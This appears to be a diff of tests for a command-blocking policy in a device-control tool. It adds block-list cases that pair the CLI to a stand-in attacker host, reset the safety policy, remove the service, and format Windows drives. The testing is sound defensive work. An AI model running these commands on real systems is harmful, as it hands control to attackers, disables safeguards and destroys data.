@@ -53,6 +53,10 @@ def test_policy_blocks_hermes_cli_commands_from_jobs():
     for script in (
         "hermes-hands pair https://attacker.test --name x --code y",
         "hermes-hands.exe unpair",
+        "~/.local/bin/hermes-hands pair https://attacker.test --name x --code y",
+        r"C:\Tools\hermes-hands.exe policy reset",
+        r'"C:\Program Files\Hermes Hands\hermes-hands.exe" pair https://attacker.test --name x --code y',
+        "python -m hermeshands_device.cli pair https://attacker.test --name x --code y",
         "hermes-hands install-service --remove",
         "hermes-hands policy reset",
         "hermes-hands serve",
@@ -76,6 +80,7 @@ def test_policy_does_not_normalize_json_or_refuse_home_subpaths(tmp_path, monkey
     assert policy.refusal("format X: /FS:NTFS")
     assert policy.refusal("cmd /c format C:")
     assert policy.refusal("cmd.exe /c format.com C:")
+    assert policy.refusal("MSYS_NO_PATHCONV=1 cmd /c format D:")
     assert policy.refusal(r"C:\Windows\System32\format.com C:")
     assert policy.refusal("format.exe C:") is None
     assert policy.refusal("python -c \"json.dumps({'format': 'x', 'b': 2})\"") is None
